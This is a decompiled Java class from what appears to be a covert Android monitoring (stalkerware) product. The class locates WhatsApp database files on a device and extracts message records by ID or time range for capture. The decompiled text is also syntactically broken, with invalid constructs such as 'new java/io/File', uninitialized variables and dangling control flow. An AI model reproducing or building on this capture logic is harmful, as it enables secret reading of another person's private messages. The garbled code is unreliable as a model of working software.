package com.vvt.capture.wa.full;

import android.os.SystemClock;
import com.vvt.base.b;
import com.vvt.base.capture.FxSimpleEventReference;
import com.vvt.base.capture.f;
import com.vvt.base.capture.g;
import java.io.File;
import java.util.ArrayList;
import java.util.Collection;
import java.util.List;

public class WhatsAppDaemonQuery
  implements f
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.b;
  private static final boolean c = com.vvt.ak.a.d;
  private static final boolean d = com.vvt.ak.a.e;
  private long e = -1;
  private String f;
  private WhatsAppDaemonQuery.DatabaseStructure g;
  private boolean h;
  private b i;
  
  public WhatsAppDaemonQuery(String paramString, b paramb)
  {
    this.f = paramString;
    this.h = false;
    WhatsAppDaemonQuery.DatabaseStructure localDatabaseStructure = WhatsAppDaemonQuery.DatabaseStructure.UNKNOWN;
    this.g = localDatabaseStructure;
    this.i = paramb;
  }
  
  private boolean b()
  {
    boolean bool1 = false;
    String[] arrayOfString = com.vvt.capture.wa.b.a.a();
    int j = arrayOfString.length;
    int k = 0;
    for (;;)
    {
      if (k < j)
      {
        String str = arrayOfString[k];
        File localFile = new java/io/File;
        localFile.<init>(str);
        boolean bool2 = localFile.exists();
        if (bool2) {
          bool1 = true;
        }
      }
      else
      {
        return bool1;
      }
      k += 1;
    }
  }
  
  public g a()
  {
    long l1 = -1;
    boolean bool1 = a;
    if (bool1) {}
    FxSimpleEventReference localFxSimpleEventReference = new com/vvt/base/capture/FxSimpleEventReference;
    localFxSimpleEventReference.<init>();
    boolean bool2;
    try
    {
      bool1 = b();
      if (bool1)
      {
        long l2 = a.a();
        bool1 = false;
        Object localObject = null;
        l3 = l2;
        int k = 0;
        for (;;)
        {
          boolean bool3 = l3 < l1;
          if (bool3) {
            break;
          }
          int m = 5;
          if (k >= m) {
            break;
          }
          l3 = 2000L;
          SystemClock.sleep(l3);
          long l4 = a.a();
          int j = k + 1;
          k = j;
          l3 = l4;
        }
      }
      boolean bool4;
      bool2 = c;
    }
    catch (Exception localException)
    {
      bool2 = d;
      if (bool2) {}
      l3 = l1;
      bool4 = l3 < l1;
      if (bool4) {
        break label161;
      }
    }
    if (bool2) {}
    long l3 = this.e;
    for (;;)
    {
      Long localLong = Long.valueOf(l3);
      localFxSimpleEventReference.setReference(localLong);
      bool2 = a;
      if (bool2) {}
      return localFxSimpleEventReference;
      label161:
      this.e = l3;
    }
  }
  
  public List a(int paramInt)
  {
    bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    for (;;)
    {
      try
      {
        bool1 = b();
        if (bool1)
        {
          long l1 = a.a();
          long l2 = 0L;
          bool1 = a;
          if (bool1) {}
          localObject1 = this.g;
          Object localObject2 = WhatsAppDaemonQuery.DatabaseStructure.UNKNOWN;
          if (localObject1 == localObject2)
          {
            bool1 = a.d();
            this.h = bool1;
            bool1 = this.h;
            if (!bool1) {
              continue;
            }
            localObject1 = WhatsAppDaemonQuery.DatabaseStructure.OLD_DESIGN;
            this.g = ((WhatsAppDaemonQuery.DatabaseStructure)localObject1);
          }
          bool1 = b;
          if (bool1) {}
          localObject1 = this.f;
          localObject2 = Integer.toString(paramInt);
          boolean bool2 = this.h;
          b localb = this.i;
          boolean bool3 = true;
          localObject1 = a.a((String)localObject1, l2, l1, (String)localObject2, bool2, localb, bool3);
          localArrayList.addAll((Collection)localObject1);
        }
      }
      catch (Exception localException)
      {
        Object localObject1;
        bool1 = d;
        if (!bool1) {
          continue;
        }
        continue;
      }
      bool1 = a;
      if (bool1) {}
      return localArrayList;
      localObject1 = WhatsAppDaemonQuery.DatabaseStructure.NEW_DESIGN;
    }
  }
  
  public List a(g paramg1, g paramg2)
  {
    bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    for (;;)
    {
      try
      {
        localObject = paramg1.getReference();
        localObject = (Long)localObject;
        long l1 = ((Long)localObject).longValue();
        localObject = paramg2.getReference();
        localObject = (Long)localObject;
        long l2 = ((Long)localObject).longValue();
        localObject = this.g;
        WhatsAppDaemonQuery.DatabaseStructure localDatabaseStructure = WhatsAppDaemonQuery.DatabaseStructure.UNKNOWN;
        if (localObject == localDatabaseStructure)
        {
          bool1 = a.d();
          this.h = bool1;
          bool1 = this.h;
          if (!bool1) {
            continue;
          }
          localObject = WhatsAppDaemonQuery.DatabaseStructure.OLD_DESIGN;
          this.g = ((WhatsAppDaemonQuery.DatabaseStructure)localObject);
        }
        bool1 = b;
        if (bool1) {}
        localObject = this.f;
        boolean bool2 = this.h;
        b localb = this.i;
        boolean bool3 = true;
        localObject = a.a((String)localObject, l1, l2, bool2, localb, bool3);
        localArrayList.addAll((Collection)localObject);
      }
      catch (Exception localException)
      {
        Object localObject;
        bool1 = d;
        if (!bool1) {
          continue;
        }
        continue;
      }
      bool1 = a;
      if (bool1) {}
      return localArrayList;
      localObject = WhatsAppDaemonQuery.DatabaseStructure.NEW_DESIGN;
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/wa/full/WhatsAppDaemonQuery.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */